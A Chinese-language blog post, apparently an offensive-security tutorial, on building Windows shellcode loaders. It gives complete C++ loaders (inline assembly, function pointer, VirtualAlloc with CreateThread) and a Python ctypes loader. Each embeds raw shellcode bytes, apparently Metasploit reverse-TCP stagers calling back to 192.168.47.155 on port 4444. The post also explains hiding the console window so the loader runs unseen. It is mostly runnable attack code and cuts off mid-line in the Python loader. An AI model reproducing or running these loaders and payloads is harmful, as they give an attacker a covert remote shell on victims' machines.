<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color" content="#3367D6"/>
  <link rel="apple-touch-icon" href="/icons-192.png">
  <link rel="manifest" href="/manifest.json">
  
  <meta name="generator" content="Hexo 6.3.0">

  

  

  
    <meta name="author" content="John Doe">
  

  

  

  <title>Hexo</title>

  

  
    <link rel="shortcut icon" href="/favicon.ico">
  

  <!--mathjax latex数学公式显示支持-->
  
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
  

  

  
<link rel="stylesheet" href="/css/style.css">

</head>
<body>
  <div class="root-container">
    
<!-- header container -->
<header class="header-container post">
  
    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
  

  <!-- navbar -->
<nav class="navbar">
  <div class="navbar-content">
    <!-- logo -->
    <div class="navbar-logo">
      <a href="/">
        
          Hexo
        
      </a>
    </div>
    <!-- link -->
    <div class="navbar-link">
      <div class="navbar-btn">
        <div></div>
        <div></div>
        <div></div>
      </div>
      <ul class="navbar-list">
        
          <li class="navbar-list-item"><a href="/">首页</a></li>
        
          <li class="navbar-list-item"><a href="/links">友链</a></li>
        
          <li class="navbar-list-item"><a href="/about">关于</a></li>
        
      </ul>
    </div>
  </div>
</nav>

  
  

  
  

  
  

  
  

  
  
    <div class="header-content">
      <div class="post-text layout-block">
        <div class="layout-margin">
          <h1 class="title-wrap"></h1>
          <h2 class="title-sub-wrap">
            <strong>John Doe</strong>
            <span>发布于</span>
            <time  class="article-date" datetime="2023-10-22T08:51:11.599Z" itemprop="datePublished">2023-10-22</time>
          </h2>
          
            <h2 class="last-time">
              <span>最后更新于</span>
              <time  class="article-updated" datetime="2023-08-25T18:09:52.000Z" itemprop="dateUpdated">2023-08-26</time>
            </h2>
          
          
          <ul class="wrap-list dark">
  
</ul>
          <ul class="wrap-list dark">
  
</ul>
        </div>
      </div>
    </div>
  

  
  
  
</header>

    <!-- 文章 -->

<!-- 文章内容 -->
<div class="body-container">
  <article class="content-container layout-block post-container">
    <div class="article-info">
      
      
      
      
      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
        <h1 id="去除黑框"><a href="#去除黑框" class="headerlink" title="去除黑框"></a>去除黑框</h1><p>当我们运行Shellcode加载器时会出现如下图所示的黑框，可采用以下方法去除它</p>
<img src="shellcode加载器/image-20230612171819718.png" alt="image-20230612171819718" style="zoom:50%;" />	



<p>将子系统设置为<code>窗口 (/SUBSYSTEM:WINDOWS)</code></p>
<img src="shellcode加载器/image-20230612172009161.png" alt="image-20230612172009161" style="zoom:67%;" />	



<p>将函数入口点设置为<code>mainCRTStartup</code></p>
<img src="shellcode加载器/image-20230612172127151.png" alt="image-20230612172127151" style="zoom:67%;" />	



<h1 id="1-内联汇编加载"><a href="#1-内联汇编加载" class="headerlink" title="1.内联汇编加载"></a>1.内联汇编加载</h1><p>使用内联汇编只能加载32位程序的ShellCode，因为64位程序不支持写内联汇编</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ShellCode部分</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">	__asm &#123;</span><br><span class="line">		lea eax,buf    <span class="comment">// 将buf的地址加载到eax寄存器</span></span><br><span class="line">		call eax  <span class="comment">// 使用call指令跳转到eax寄存器指向的地址（即buf），开始执行shellcode</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-使用函数指针加载"><a href="#2-使用函数指针加载" class="headerlink" title="2.使用函数指针加载"></a>2.使用函数指针加载</h1><p>如下代码所示，<code>(void(*)(void))</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 <code>buf</code> 的地址转换为一个函数指针，然后调用该指针所指向的函数，其实这种方法和上述加载方式原理是一样的，只不过这种方法还能用于加载64位的ShellCode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ShellCode部分</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">	((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; buf)();  <span class="comment">//执行ShellCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-创建线程加载"><a href="#3-创建线程加载" class="headerlink" title="3.创建线程加载"></a>3.创建线程加载</h1><p>上述两种方法都需要将data节的内存设置成可读可写可执行,  以下这段代码的主要作用是在内存中分配一段可执行的内存空间，将buf数组中的内容复制到该内存空间，并创建一个新线程来执行这段内存中的代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 申请一块可进行读写操作的内存</span></span><br><span class="line">    LPVOID pMemory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将buf数组中的内容复制到刚刚分配的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(pMemory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的线程来执行内存中的代码</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待新创建的线程执行完成</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下述是申请内存加载的python版本代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用MSF生成的python格式的ShellCode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x56\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x4d&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bytearray()函数返回一个新字节数组</span></span><br><span class="line">shellcode= <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#VirtualAlloc函数用来开辟内存空间,返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64</span><br><span class="line">ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#RtlMoveMemory函数将Shellcode加载至此段内存空间</span></span><br><span class="line">buf= (ctypes.c_char *<span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">   ctypes.c_uint64(ptr),</span><br><span class="line">   buf,</span><br><span class="line">   ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用CreateThread函数创建一个线程从Shellcode的起始地址开始执行此段内存空间的内容</span></span><br><span class="line">handle= 